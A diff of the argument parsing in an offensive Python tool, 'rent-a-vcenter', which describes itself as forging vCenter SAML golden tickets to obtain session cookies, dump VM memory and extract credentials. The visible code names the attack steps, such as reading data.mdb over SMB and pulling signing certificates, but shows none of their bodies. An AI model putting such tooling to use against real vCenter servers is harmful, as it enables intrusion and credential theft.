@@ -2020,11 +2020,11 @@ def parse_args():
         prog='rent-a-vcenter',
         description='vCenter SAML golden ticket — session cookie, VM memory dump, credential extraction',
     )
-    ap.add_argument('target', metavar='TARGET', nargs='?', default=None,
-                    help='vCenter IP or hostname')
-    ap.add_argument('--local-path', metavar='PATH', dest='local_path',
+    ap.add_argument('target', metavar='TARGET', help='vCenter IP or hostname')
+    src = ap.add_mutually_exclusive_group(required=True)
+    src.add_argument('--local-path', metavar='PATH', dest='local_path',
                     help='data.mdb file, directory, or archive containing it')
-    ap.add_argument('-t', metavar='HOST|UNC',
+    src.add_argument('-t', metavar='HOST|UNC',
                     help='SMB target — bare host (enumerate all shares) or UNC path (\\\\host\\share[\\path])')
     ap.add_argument('-u', metavar='USER', default='',
                     help='Username (SMB auth / SSO fallback)')
@@ -2051,16 +2051,11 @@ def main():
             paths = discover_local(args.local_path)
         elif args.t:
             paths = discover_smb(args.t, args.u or '', args.p or '', args.d or '')
-        else:
-            sys.exit('[-] Provide --local-path PATH or -t HOST')
 
         mdb_path = resolve_mdb(paths, work_dir)
         sol_key, sol_cert = resolve_solution_creds(paths, verbose=args.verbose)
         key_pem, cert1_pem, cert2_pem, mdb_domain = certs_from_mdb(mdb_path, args.verbose)
         domain = args.d or mdb_domain
-
-        if not args.target:
-            sys.exit('[-] TARGET (vCenter IP/hostname) is required to continue')
 
         hostname  = get_vcenter_hostname(args.target)
         authn_id  = get_saml_authn_request(args.target)
